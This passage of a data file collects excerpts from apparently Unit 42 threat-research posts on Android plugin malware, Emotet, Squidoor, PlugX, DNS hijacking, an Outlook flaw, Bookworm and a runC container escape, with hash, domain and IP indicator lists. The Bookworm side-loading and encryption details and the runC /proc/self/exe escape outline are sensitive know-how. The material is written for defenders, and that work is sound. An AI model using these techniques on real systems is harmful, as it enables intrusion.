it is the first to use updating and to evade static detection. It does this by leveraging the Android plugin technology. It abuses the legitimate and popular open source framework \"DroidPlugin\", which allows an app to dynamically launch any apps as plugins without installing them in the system. PluginPhantom implements each element of malicious functionality as a plugin, and utilizes a host app to control the plugins. With the new architecture, PluginPhantom achieves more flexibility to update its modules without reinstalling apps. PluginPhantom also gains the ability to evade the static detection by hiding malicious behaviors in plugins. Since the plugin development pattern is generic and the plugin SDK can be easily embedded, the plugin architecture could be a trend among Android malware in the future.", "source": "Palo"}, {"title": "Conclusion", "content": "While the Android plugin technology is very hot in the Android app development, it also gives a chance to malware developers to redesign malware in a more flexible way. Like the PluginPhantom family, malware can easily update or add modules by updating or installing plugin apps. In terms of evasion, the plugin malware can hide all malicious behaviors in plugin apps, which can be downloaded and launched to bypass static detection. Additionally, the plugin technology might be a replacement of the repackage technique in the future. The plugin malware only needs to launch the original app as one plugin, and later launch malicious modules as other plugins. Even though the PluginPhantom is the first malware using the legitimate DroidPlugin framework, we will continue to watch and report this threat as attackers may use other plugin frameworks and launch more attacks.\nCustomers of Palo Alto Networks are protected with our WildFire, URL filtering and IPS services. AutoFocus users can identify samples of this malware using thePluginPhantomtag.", "source": "Palo"}, {"title": "Introduction", "content": "Malicious spam (malspam) pushing Emotet malware is the most common email-based threat, far surpassing other malware families,with only a few other threats coming close.\nIn recent weeks, we have seen significantly more Emotet malspam using a technique called \"thread hijacking\" that utilizes legitimate messages stolen from infected computers' email clients. This malspam spoofs a legitimate user and impersonates a reply to the stolen email. Thread hijacked malspam is sent to addresses from the original message.\nThis technique is much more effective than less sophisticated methods, which many people have now learned to spot. The approach is more successful at convincing potential victims to click on an attached file, or to click on a link to download a malicious Word document with macros designed to infect a user with Emotet.\nHere, we review a case study of Emotet's thread hijacking process so we can better recognize and understand this technique.\nPalo Alto Networks customers are protected from this threat because ourThreat Preventionsecurity subscription detects and prevents these types of Emotet infections.AutoFocususers can track Emotet activity using theEmotettag.", "source": "Palo"}, {"title": "Conclusion", "content": "We've storedan example of the legitimate emailthat was hijacked in this case study.\nWe've also storedan example of the spoofed messagessent from the Emotet botnet.\nThepcap of infection trafficfrom this case study is also available.\nThis case study shows an example of Emotet thread hijacking so we can better understand how Emotet malware utilizes this technique. Emotet is a very active threat that constantly updates its malware in an attempt to evade detection. This vector of infection can reach a great deal of potential victims.\nHowever, organizations with effective spam filtering that follow best security practices have a much lower risk from this infection vector. Palo Alto Networks customers are further protected from this threat, because ourThreat Preventionsecurity subscription detects and prevents these types of Emotet infections.AutoFocususers can track Emotet activity using theEmotettag.", "source": "Palo"}, {"title": "Introduction", "content": "In December 2016 I postedthe first of a two-partblog series, the second of whichposted in April this year, to start a series of regular threat report updates to the public covering different sets of countries from around the EMEA (Europe Middle East and Africa) region. This blog is the first of a new series of bi-monthly threat reports that will focus only on one set of countries where before the series focused on two sets covering six or more countries. This new series will dig deeper into current trends, the threats affecting each country, and provide useful tips for mitigating these threats via our AutoFocus Threat Intelligence Service.\nIn my previous blogs, I introduced the EMEA region at a high-level\u2013 a large group of countries each with mixed languages, cultures, and cyber security maturity levels. Each also with different industry sectors and different economic profiles, which in turn creates a very diverse environment potentially ripe for cyberattacks.\nThe countries in this blog includes the United Kingdom, Germany, and France for the month of February.", "source": "Palo"}, {"title": "Conclusion", "content": "EMEA is a socially and economically diverse region with many interesting assets whether they be citizen data, financial information, or natural resources and, as such, is a target for cyber criminals the world over.\nIt's probably no surprise to see ransomware as a prevalent malware crossing all borders into all countries as this malware is really victim-agnostic. Any data on any computer in any country is a viable target. We saw a slight change with one family, Spora, which made an appearance over the web-browsing application as opposed to the typical method of malspam over smtp.\nClearly information-stealing malware, such as Pony and tools, such as PasswordFox and IEPassView, are prevalent in countries that have a more service-based economy that manage and process plenty of user data and personally identifiable information (PII).", "source": "Palo"}, {"title": "Introduction", "content": "This article reviews a cluster of malicious activity that we identify as CL-STA-0049. Since at least March 2023, a suspected Chinese threat actor has targeted governments, defense, telecommunication, education and aviation sectors in Southeast Asia and South America.\nThe observed activity includes collecting sensitive information from compromised organizations, as well as obtaining information about high-ranking officials and individuals at those organizations.\nDuring our investigation, we were able to shed new light on the attacker's tactics, techniques and procedures (TTPs), including the attack flow, entry vector via web shells and covert communication channels.\nThe threat actor behind thisactivity clusterused a recently discovered sophisticated backdoor we named Squidoor (akaFinalDraft), which targets both Windows and Linux systems. This article reveals a new Windows variant of Squidoor, and provides a deeper understanding of Squidoor's command and control server (C2) communication than has been previously described.\nSquidoor is an advanced backdoor that supports multiple modules, designed for stealth. It features a rarely seen set of capabilities, including using multiple protocols to communicate with the C2 such as the following:\nOutlook API \nDomain Name System (DNS) tunneling \nInternet Control Message Protocol (ICMP) tunneling\nBased on our analysis of the TTPs, we assess with moderate-high confidence that this activity originates in China.\nOur objective in sharing this analysis is to equip cybersecurity professionals in these high-risk sectors with effective detection and mitigation strategies against these advanced threats.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products and services:\nCortex XDRandXSIAM \nCloud-Delivered Security Servicesfor theNext-Generation Firewall, including:Advanced WildFireAdvanced URL FilteringAdvanced Threat Prevention \nAdvanced WildFire \nAdvanced URL Filtering \nAdvanced Threat Prevention\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "The threat actor behind the CL-STA-0049 cluster of activity has attacked high-value targets in South America and Southeast Asia. The primary objective appears to be gaining a foothold and obtaining sensitive information from their targets. We assess with moderate-high confidence that this threat actor is of Chinese origin.\nSquidoor, the main backdoor used in this operation, is engineered for an enhanced level of stealth and offers 10 distinct methods for covert C2 communication. This versatility has allowed the attackers to adapt to various scenarios and minimize suspicious network traffic emanating from compromised environments.\nSquidoor's multi-platform implementations, with tailored versions for both Windows and Linux operating systems, expand its reach and attack surface. This adaptability enables the malware to infiltrate diverse network ecosystems, potentially compromising a broader range of targets and complicating detection and mitigation efforts across heterogeneous infrastructures.\nWe encourage security practitioners and defenders to study this report and use the information provided to enhance current detection, prevention and hunting practices to strengthen their security posture.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 hash for Squidoor - Windows version (config.ini)\nf663149d618be90e5596b28103d38e963c44a69a5de4a1be62547259ca9ffd2d\nSHA256 hashes for Squidoor - Linux version\n83406905710e52f6af35b4b3c27549a12c28a628c492429d3a411fdb2d28cc8c \n8187240dafbc62f2affd70da94295035c4179c8e3831cb96bdd9bd322e22d029 \nfa2a6dbc83fe55df848dfcaaf3163f8aaefe0c9727b3ead1da6b9fa78b598f2b \n3fcfc4cb94d133563b17efe03f013e645fa2f878576282805ff5e58b907d2381 \nf45661ea4959a944ca2917454d1314546cc0c88537479e00550eef05bed5b1b9\nSHA256 hashes for associated web shells\n9f62c1d330dddad347a207a6a565ae07192377f622fa7d74af80705d800c6096 \n461f5969b8f2196c630f0868c2ac717b11b1c51bc5b44b87f5aad19e001869cc \n224becf3f19a3f69ca692d83a6fabfd2d78bab10f4480ff6da9716328e8fc727 \n6c1d918b33b1e6dab948064a59e61161e55fccee383e523223213aa2c20c609c \n81bd2a8d68509dd293a31ddd6d31262247a9bde362c98cf71f86ae702ba90db4 \n7c6d29cb1f3f3e956905016f0171c2450cca8f70546eee56cface7ba31d78970 \nc8a5388e7ff682d3c16ab39e578e6c529f5e23a183cd5cbf094014e0225e2e0a \n1dd423ff0106b15fd100dbc24c3ae9f9860a1fcdb6a871a1e27576f6681a0850 \n82e68dc50652ab6c7734ee913761d04b37429fca90b7be0711cd33391febff0a \ne8d6fb67b3fd2a8aa608976bcb93601262d7a95d37f6bae7c0a45b02b3b325ad \n2b6080641239604c625d41857167fea14b6ce47f6d288dc7eb5e88ae848aa57f \n33689ac745d204a2e5de76bc976c904622508beda9c79f9d64c460ebe934c192 \n5dd361bcc9bd33af26ff28d321ad0f57457e15b4fab6f124f779a01df0ed02d0 \n945313edd0703c966421211078911c4832a0d898f0774f049026fc8c9e7d1865 \na7d76e0f7eab56618f4671b5462f5c210f3ca813ff266f585bb6a58a85374156 \n265ceb5184cac76477f5bc2a2bf74c39041c29b33a8eb8bd1ab22d92d6bebaf5\nDomains\nSupport.vmphere[.]com \nUpdate.hobiter[.]com \nmicrosoft-beta[.]com \nzimbra-beta[.]info \nmicrosoftapimap[.]com\nIP addresses\n209.141.40[.]254 \n104.244.72[.]123 \n47.76.224[.]93", "source": "Palo"}, {"title": "Introduction", "content": "In this article, we explain our process of detecting domain name service (DNS) hijacking and provide some notable examples of this detection from the first half of 2024. DNS hijacking allows cybercriminals to modify DNS records of domain names and redirect users to malicious servers.\nThreat actors compromise domains for a variety of different types of attacks, including meddler in the middle (MitM) attacks, drive-by downloads, phishing and scams. Hijackers use a victim domain's reputation to direct victims into malicious campaigns, independent of the expectations of its original visitors. For example, to hijack domains criminals can steal domain owners' credentials at registrars or DNS service providers or alternatively infiltrate these services.\nTo detect DNS hijacking, we process an average of 167 million new DNS records every day. After initial preprocessing, we take the remaining records that are candidates for detection as DNS hijacking, and we extract 74 features from over 169 terabytes ofpassive DNS (pDNS)and geolocation data. We then use a machine learning model to predict whether or not these candidate records are truly the result of DNS hijacking.\nBetween March and September 2024, our detection pipeline processed over 29 billion new records and identified 6,729 as hijacking, with an average daily detection of 38 records. Recently, we deployed a new version of our model that can detect DNS hijacking in our customers' traffic in around 10 minutes.\nThis article provides some notable examples of DNS hijacking that our pipeline has detected over this period. Examples include:\nThe DNS hijacking of a Hungarian political party's domain name \nThe defacement of a large utility company and internet service provider (ISP) \nUsing the domains of a university and research center to host illicit gambling\nPalo Alto NetworksNext-Generation Firewallcustomers receive protection from DNS hijacking via our automated classifier in the Palo Alto NetworksAdvanced DNS Securitysubscription service.\nPalo Alto NetworksCortex XpanseandCortex XSIAMcan help customers detect and respond to potential subdomain hijacking risks by identifying susceptible CNAME DNS records on customer-attributed domains.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "DNS hijacking is a pervasive threat that can have catastrophic consequences for domain owners and their customers. An incident on Oct. 22, 2016, is a stark example of this. Cybercriminals seized control of the entire online operation of a major Brazilian bank with over 5 million customers and 500 branches worldwide, as reported byKaspersky Lab.\nThe attackers gained control of online banking, mobile, point-of-sale, ATM and investment transactions. During the 5-hour attack, the criminals collected electronic transactions, redirected users to phishing sites to steal their login credentials, and attacked users with malware.\nWhen the malware successfully infected customer's machines, it first disabled antimalware software to avoid detection. It then harvested various credentials and targeted other banks the customer might have used.\nThe attackers gained control of the bank's online assets by compromising the bank'sDNS service provider. While the criminal group's method of compromising the DNS service provider is unclear, the attackers were able to control 36 domains belonging to the bank.\nThe attackers also abused Let's Encrypt as a free and legitimate certificate authority,establishing certificatesto make communication with these domains and subsequent malicious servers look legitimate. In summary, DNS hijacking landed a major bank's entire operation in criminal hands.\nThreat actors often abuse, take advantage of or subvert legitimate products for malicious purposes. This does not imply that the legitimate product itself is flawed or malicious.\nDNS Hijacking in Practice\nThreat actors can hijack DNS records using different methods. An attacker can take over the domain owner's account at adomain registraror a DNS service provider or infiltrate the registrar/DNS service provider.\nFor example, attackers can use phishing, password guessing or breach another site to take over accounts. In such scenarios, mitigation techniques such as Domain Name System Security Extensions (DNSSEC) or encrypting DNS queries and responses (e.g., DNS over HTTPS and DNS over TLS) are insufficient to prevent attackers from hijacking the records.\nAlternatively, attackers can hijack DNS records viaDNS cache poisoningor other attacks manipulating DNS responses, such as MitM attacks intercepting communication and modifying the DNS queries on the fly. Cybercriminals hijack DNS records and change the resolution of domains to redirect requests for a domain to a destination they control. DNS hijacking is typically a precursor to other attacks, such as scams or drive-by-downloads.", "source": "Palo"}, {"title": "Conclusion", "content": "Our machine learning-based pipeline processes an average of 167 million new DNS records daily and leverages hundreds of terabytes of pDNS and geolocation data to detect DNS hijacking. Every day, our detector flags dozens of records as hijacking to protect our customers. Recently, we deployed a new version of our model that can detect DNS hijacking in our customers' traffic in around 10 minutes.\nWe observe that cybercriminals use compromised domains to host phishing content, to deface websites, or to spread illicit content. In this post, we selected examples of DNS hijacking that our automatic pipeline has found, including the following:\nOne of the largest utility companies in the U.S. \nA large ISP \nA major political party in Hungary \nA university \nA research center\nPalo Alto NetworksNext-Generation Firewallcustomers receive protection from DNS hijacking via our automated classifier in the Palo Alto NetworksAdvanced DNS Securitysubscription service.\nPalo Alto NetworksCortex XpanseandCortex XSIAMcan help customers detect and respond to potential subdomain hijacking risks by identifying susceptible CNAME DNS records on customer-attributed domains.", "source": "Palo"}, {"title": "Indicators", "content": "DNS hijacking records\nc-sharp[.]in A 139.59.255[.]10 \nccdc.org[.]do A 139.59.255[.]10 \ndkujpest[.]hu A 135.148.57[.]147 \ndkujpest[.]hu A 152.70.176[.]210 \nmail.uts.ac[.]id A 159.223.92[.]200 \nns1.uts.ac[.]id A 159.223.92[.]200 \nns2.uts.ac[.]id A 159.223.92[.]200 \nns3.uts.ac[.]id A 159.223.92[.]200 \nns4.uts.ac[.]id A 159.223.92[.]200 \nns5.uts.ac[.]id A 159.223.92[.]200 \nns6.uts.ac[.]id A 159.223.92[.]200 \nuts.ac[.]id A 159.223.92[.]200 \nuts.ac[.]id NS ns5.uts.ac[.]id \nuts.ac[.]id NS ns6.uts.ac[.]id \nuts.ac[.]id MAIL mail.uts.ac[.]id\nIP addresses used by attackers\n135.148.57[.]147 \n139.59.255[.]10 \n152.70.176[.]210 \n159.223.92[.]200 \n176.9.24[.]28\nNameservers used by attackers\nns1[.]csit-host[.]com \nns2[.]csit-host[.]com", "source": "Palo"}, {"title": "Introduction", "content": "Recently, our Unit 42 incident response team was engaged in a Black Basta breach response that uncovered several tools and malware samples on the victim's machines, includingGootLoadermalware,Brute Ratel C4red-teaming tool and an olderPlugXmalware sample. The PlugX malware stood out to us as this variant infects any attached removable USB media devices such as floppy, thumb or flash drives and any additional systems the USB is later plugged into.\nThis PlugX malware also hides actor files in a USB device using a novel technique that works even on the most recent Windows operating systems (OS) at the time of writing this post. This means the malicious files can only be viewed on a Unix-like (*nix) OS or by mounting the USB device in a forensic tool.\nWe also discovered a similar variant of PlugX in VirusTotal that infects USB devices and copies all Adobe PDF and Microsoft Word files from the host. It places these copies in a hidden folder on the USB device that is created by the malware.\nPlugX is a second-stage implant used not only by multiple groups with a Chinese nexus but also by several cybercrime groups. It has been around for over a decade and has been observed in some high-profile cyberattacks, including theU.S. Government Office of Personnel Management (OPM)breach in 2015. It is a modular malware framework, supporting an evolving set of capabilities throughout the years.\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products includingCortex XDRandWildFire.", "source": "Palo"}, {"title": "Introduction", "content": "It's not uncommon for multiple malware samples to be discovered during an investigation, as occurred in this situation with GootLoader, Brute Ratel C4 and PlugX. Numerous threat actors compromise targets and can coexist simultaneously on the affected machine.\nBecause we can't conclusively say whether these malware samples were left by one group or several, we can't attribute these tools to the Black Basta ransomware group. However, the version of Brute Ratel C4 used in this case is the same one reported byTrend Micro, which also involved the Black Basta ransomware group.", "source": "Palo"}, {"title": "Conclusion", "content": "PlugX malware has been used for over a decade and was historically extensively associated with Chinese nation-state APT groups. Over the years, it has been adopted and used by other threat groups, from nation-states to ransomware actors.\nThe typical tradecraft of PlugX uses benign files to achieve code execution, also known as DLL side loading, that many security vendors now detect and prevent. This might be part of why the actors added the capability to infect any attached removable media USB devices such as floppy, thumb or flash drives as well as any additional systems the USB is later plugged into.\nAny host infected with this variant of the PlugX malware will continuously monitor for new USB removable devices to infect. This PlugX malware also hides attacker files in a USB device with a novel technique, which makes the malicious files only viewable on a *nix OS or by mounting the USB device in a forensic tool. Because of this ability to evade detection, the PlugX malware can continue to spread and potentially jump to air-gapped networks.\nAdditionally, we discovered a similar variant of PlugX in VirusTotal with the added capability of copying all Adobe PDF and Microsoft Word documents from the infected host to the USB device's hidden folder created by the PlugX malware. The discovery of these samples indicates PlugX development is still alive and well among at least some technically skilled attackers, and it remains an active threat.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign:\nCortex XDRcustomers receive protection at the endpoints from the malware techniques described in this blog. \nWildFirecloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nIf you think you may have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Known PlugX Samples:\n8ec37dac2beaa494dcefec62f0bf4ae30a6ce44b27a588169d8f0476bbc94115e72e49dc1d95efabc2c12c46df373173f2e20dab715caf58b1be9ca41ec0e1720e9071714a4af0be1f96cffc3b0e58520b827d9e58297cb0e02d97551eca379939280139735145ba6f0918b684ab664a3de7f93b1e3ebcdd071a5300486b8d2041a0407371124bcad7cab56227078ccd635ba6e6b4374b973754af96b7f5811902aa5b52137410de7cc26747f26e07b65c936d019ee2e1afae268a00e78a1f7f2a07877cb53404888e1b6f81bb07a35bc804daa1439317bccde9c498a521644c5d98d1193fcbb2479668a24697023829fc9dc1f7d31833c3c42b8380ef859ff1\nKnown File Directories\nC:\\ProgramData\\UsersDate\\Windows_NT\\Windows\\user\\Desktop\\C:\\Users\\Public\\Public Mediae\\<usb volume>:\\u00A0\\u00A0\\RECYCLER.BIN\\files<usb volume>:\\u00A0\\u00A0\\RECYCLER.BIN\\files\\da520e5\nKnown Windows Mutex Names\nLKU_Test_0.1LKU_Test_0.2TCP_0.1\nKnown PlugX Encrypted Payload File Names\nakm.datprecious.datx32bridge.datGroza_1.dat\nKnown Windows Scheduled Task Names\nLKUFORYOU_1PRECIOUS_0.1\nKnown Windows Process Names (Observed Abused Benign Files)\nx32dbg.exex32dbge.exeMediae.exeAug.exePrecious.exeSafeGuard.exeDism.exe\nMITRE ATT&CK Techniques\nATOM PlugX Malware", "source": "Palo"}, {"title": "Introduction", "content": "On March 14, 2023, Microsoft released a patch forCVE-2023-23397. CVE-2023-23397 is a vulnerability in the Windows Microsoft Outlook client that can be exploited by sending a specially crafted email that triggers automatically when it is processed by the Outlook client. No user interaction is required to trigger the exploit.\nExploitation of the vulnerability will leak the targeted user's Net-NTLMv2 hashes. This could then be used to conduct relay attacks to other systems that support NTLMv2, allowing the threat actor to authenticate as the targeted user.\nRelay attacks are much more effective when the threat actor already has a foothold into the targeted network. This is because Windows New Technology LAN Manager (NTLM) authentication is commonly used within an Active Directory (AD) environment and not for services exposed to the Internet. Therefore, relaying leaked hashes remotely should be much less common.\nRemote attacks will rely on cracking weak underlying credentials of the leaked Net-NTLMv2 hashes and using the cracked, cleartext credentials to manually log into externally exposed services the targeted user has access to.\nThe vulnerability affects all versions of Outlook for Windows. Outlook for Android, iOS, Mac, and Windows users who use Outlook on the web (formerly known as Outlook Web Application) without using the Outlook client are not affected.", "source": "Palo"}, {"title": "Conclusion", "content": "Palo Alto Networks highly recommends applying Microsoft's patch for the Outlook client software. If you can't apply the patch, followMicrosoft's guidanceto protect your organization until patching is convenient. Palo Alto Networks and Unit 42 will continue to monitor the situation for updated information, release of proof-of-concept code and evidence of more widespread exploitation.", "source": "Palo"}, {"title": "Indicators", "content": "The following indicators wereprovided by Microsoft.\nSeveral malicious samples have been uploaded to VirusTotal and a signature has been created that identifies potentially malicious messages associated with exploitation of CVE-2023-23397.VirusTotal subscribers can review those results.\nKnown IP addresses associated with exploitation of this vulnerability in the above VirusTotal results are listed below. Note: These IP addresses were assessed by Microsoft Threat Intelligence to be compromised infrastructure.\n101.255.119[.]42 \n213.32.252[.]221 \n168.205.200[.]55 \n185.132.17[.]160 \n69.162.253[.]21 \n113.160.234[.]229 \n181.209.99[.]204 \n82.196.113[.]102 \n85.195.206[.]7 \n61.14.68[.]33", "source": "Palo"}, {"title": "Introduction", "content": "The threat actors use a commercial installation tool calledSmart Installer Makerto encapsulate and execute a self-extracting RAR archive and in some cases a decoy slideshow or Flash installation application. The self-extracting RAR writes a legitimate executable, an actor-created DLL called Loader.dll and a file named readme.txt to the filesystem and then executes the legitimate executable.\nFigure 1 Architecture of Bookworm\nThus far, the actors deploying bookworm have used the legitimate executables Microsoft Malware Protection (MsMpEng.exe) and Kaspersky Anti-Virus (ushata.exe) to perform DLL side-loading and load the Loader.dll. Loader.dll decrypts the readme.txt file using a three byte XOR algorithm with 0xd07858 as a key, which results in shellcode that is responsible for decrypting the remainder of readme.txt containing the actual Bookworm Trojan. The shellcode then loads Bookworm by manually loading another DLL named \"Leader.dll\" embedded in the decrypted readme.txt and passes a buffer to Leader.dll containing additional DLLs. Leader.dll is the main component of Bookworm, which will we refer to as \"Leader\" for the remainder of this blog.\nThe initial execution of Leader results in the installation of Bookworm. The installation process involves moving the legitimate executable and actor-created DLL to a new location. Bookworm also creates an additional file in this new location that has the same filename as the actor-created DLL but with no file extension. Figures 2 and 3 shows the newly created files based on the legitimate application used to side-load the actor created DLL.\n%AllUsersProfile%\\Application Data\\Microsoft\\DeviceSync\\MsMpEng.exe%AllUsersProfile%\\Application Data\\Microsoft\\DeviceSync\\MpSvc.dll%AllUsersProfile%\\Application Data\\Microsoft\\DeviceSync\\MpSvc\nFigure 2 Files created if the Microsoft Malware Protection was used to Sideload the DLL\n%AllUsersProfile%\\Application Data\\Microsoft\\DeviceSync\\ushata.exe%AllUsersProfile%\\Application Data\\Microsoft\\DeviceSync\\ushata.dll%AllUsersProfile%\\Application Data\\Microsoft\\DeviceSync\\ushata\nFigure 3 Files created if the Kaspersky Antivirus application was used to Sideload the DLL\nAfter this process is completed, Bookworm changes how it loads itself, now reading the newly created file \"MpSvc\" or \"ushata\" instead of readme.txt. The newly created file is encrypted with RC4 using the contents of the following registry value as its key:\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Internet Explorer\\Registration\\ProductID\nThe decrypted contents of this new file contain a path to the following file:\n%AllUsersProfile%\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys\\sgkey.data\nThe sgkey.data file contains the shellcode from readme.txt that loads the Bookworm modules, but instead of being encrypted with the three byte XOR algorithm like readme.txt, sgkey.data is encrypted with RC4 using the \"ProductID\" value as the key. The installation process finishes with the creation of a service named \"Microsoft Windows DeviceSync Service\", which results in the addition of registry keys listed in Figure 4, which will run Bookworm when the system starts.\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\Type: 0x00000120HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\Start: 0x00000002HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\ErrorControl: 0x00000001HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\ImagePath: \"C:\\Documents and Settings\\All Users\\Application Data\\Microsoft\\DeviceSync\\MsMpEng.exe\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\DisplayName: \"Microsoft Windows DeviceSync Service\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\ObjectName: \"LocalSystem\"HKLM\\SYSTEM\\CurrentControlSet\\Services\\DeviceSync\\Description: \"Allows USB devices to be hosted on this computer. If this service is stopped, any hosted USB devices will stop functioning and no additional hosted devices can be added. If this service is disabled, any services that explicitly depend on it will fail to start.\"\nFigure 4 Registry Keys Resulting from the Creation of the Bookworm Service", "source": "Palo"}, {"title": "Introduction", "content": "EITest is a nameoriginally coined by Malwarebytes Labs in 2014to describe a campaign that uses exploit kits (EKs) to deliver malware. Until early January 2016, \"EITest\" was used as a variable name in the attacker's malicious injected script in pages on legitimate websites compromised by this campaign. While the variable name is gone, the name for the campaign remains: we still call this campaign \"EITest\" and it continues to use EKs to distribute a variety of malware.\nWe reviewed EITest inMarch 2016andOctober 2016. However, the EITest campaign looks noticeably different than when we last reviewed it three months ago.\nThe EITest campaign is focused on the Delivery, Exploitation, and Installation phases of thecyber attack lifecycle. The way the attacker executes each of these phases changes over time, and this blog examines the changes during the last quarter of 2016. Two significant changes have occurred during this time.\nSince our last report, EITest no longer uses a gate between the compromised website and the EK landing page (possibly in response to that report). \nScript injected by the campaign into pages on legitimate websites no longer contains any obfuscation.\nPerhaps the most interesting thing about EITest is its longevity.  People have been tracking this campaign since 2014, and its longevity suggests that despite theshifting EK landscape, EKs remain a profitable venture for the criminals involved.", "source": "Palo"}, {"title": "Conclusion", "content": "EKs are still a popular method to distribute malware. Campaigns like EITest continue to use EKs to deliver a variety of malware, including information stealers and ransomware. These campaigns do not have a specific target and anyone with a Windows system that's out of date or has out of date applications is vulnerable to infection.\nAs the EK model of distribution remains profitable, we expect to see malware delivered by EKs through campaigns such as EITest. Domains, IP addresses, and other indicators associated with this campaign are constantly changing. Fortunately, EKs are relatively ineffective against people using a fully-patched Windows operating system who ensure their applications are all up-to-date. Furthermore, customers of Palo Alto Networks are protected from the EITest campaign through our next-generation security platform.", "source": "Palo"}, {"title": "Introduction", "content": "Threat actors frequently exploit trending events like global sporting championships to launch attacks, including phishing and scams. Because of this, proactive monitoring of event-related domain abuse is crucial for cybersecurity teams.\nOur network abuse investigations regularly uncover suspicious domain registration campaigns, particularly those using event-specific keywords or phrases in newly registered domains. These campaigns often surge around notable events.\nOur analysis of event-related abuse focuses on the following trends:\nDomain registrations \nDNS traffic \nURL traffic \nMost active domains \nVerdict change requests \nDomain textual patterns\nOur example case studies include observations related to the 2024 Summer Olympics in Paris.\nPalo Alto Networks customers are better protected against various network threats leveraging terminology associated with the current trending events through cloud-delivered security services such asAdvanced DNS Security,Advanced URL FilteringandAdvanced WildFire. If you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response Team.", "source": "Palo"}, {"title": "Conclusion", "content": "High-profile events are prime targets for threat actors, where they frequently exploit public interest through deceptive domains, phishing and malicious traffic. By monitoring key metrics like domain registrations, textual patterns, DNS anomalies and change request trends, security teams can identify and mitigate threats early. Proactive analysis of these trends provides valuable intelligence, assisting organizations to block malicious domains and defend against opportunistic scams.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products:\nNext-Generation Firewallwithcloud-delivered security servicesincludingAdvanced DNS SecurityandAdvanced URL Filtering. \nAdvanced WildFireis a cloud-based threat detection engine that detects the malware.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "When you visit a website, do you ever feel like you're being watched? Who is observing your movements through that website - or across the internet in general? Is it possible to limit or at least understand that information flow?\nWith advertising at the heart of much of the internet, user data is an invaluable resource to those companies that profit from monitoring people's online activities. In many cases, the information they collect provides helpful (if not truly necessary) support for a good user experience. In other cases, tracking practices infringe on people's privacy, and they have raised valid concerns.\nIn response to these concerns, many groups have developed tools or adapted applications to protect user privacy. One step taken by major browsers is to block third-party cookies. This action has led analytics, advertising and marketing organizations to develop new strategies for collecting user information. One of these is CNAME cloaking.\nCNAME cloaking leverages the Domain Name System (DNS) to hide when a browser is sending information to a domain controlled by a third party (such as an advertiser) rather than staying on the domain controlled by a website owner. CNAME cloaking undermines mechanisms that some people depend on to guard their privacy, and could lead to or be used with other practices that decrease people's privacy.\nPalo Alto Networks has developed a system to detect domains used in CNAME cloaking. The insights generated by this detector are available toPalo Alto Networks Next-Generation Firewallcustomers withcloud-delivered security services, includingDNS SecurityandAdvanced URL Filtering.", "source": "Palo"}, {"title": "Conclusion", "content": "Many websites use CNAME cloaking to circumvent browser restrictions on third-party cookies. It is useful for those who want to leverage the services of third-party analytics, advertising or marketing organizations efficiently.\nWhile cookies and the services provided by organizations that deal in tracked information can serve constructive purposes, CNAME cloaking raises serious security and privacy concerns. First and foremost, the practice decreases visibility into who is receiving users' data, and it limits people's ability to control what's done with their information. Secondly, CNAME cloaking can lead to extra user information being sent to third parties due to cookie leaks. Finally, the use of CNAME cloaking could indicate a willingness to undermine other privacy protections, as we also see it in conjunction with other questionable practices such as cookie syncing.\nPalo Alto Networks detects domains using CNAME cloaking and assigns them to the adtracking category through ourcloud-delivered security services for Next-Generation Firewalls. These subscriptions includeDNS SecurityandAdvanced URL Filtering. Through this detector, we provide our customers visibility into and control over where their data is sent.", "source": "Palo"}, {"title": "Introduction", "content": "Let's go over the vulnerability overview given by the runC team:\nThe vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts:\nCreating a new container using an attacker-controlled image. \nAttaching (docker exec) into an existing container which the attacker had previous write access to.\nThose two scenarios might seem different, but both require runC to spin up a new process in a container and are implemented similarly. In both cases, runC is tasked with running a user-defined binary in the container. In Docker, this binary is either the image's entry point when starting a new container, or docker exec's argument when attaching to an existing container.\nWhen this user binary is run, it must already be confined and restricted inside the container, or it can jeopardize the host. In order to accomplish that, runC creates a 'runC init' subprocess which places all needed restrictions on itself (such as entering or setting up namespaces) and effectively places itself in the container. Then, the runC init process, now in the container,callsthe execve syscall to overwrite itself with the user requested binary.\nThis is the method used by runC both for creating new containers and for attaching a process to an existing container.\nThe researchers who revealed the vulnerability discovered that an attacker can trick runC into executing itself by asking it to run /proc/self/exe, which is a symbolic link to the runC binary on the host.\nAn attacker with root access in the container can then use /proc/[runc-pid]/exe as a reference to the runC binary onthe hostand overwrite it. Root access in the container is required to perform this attack as the 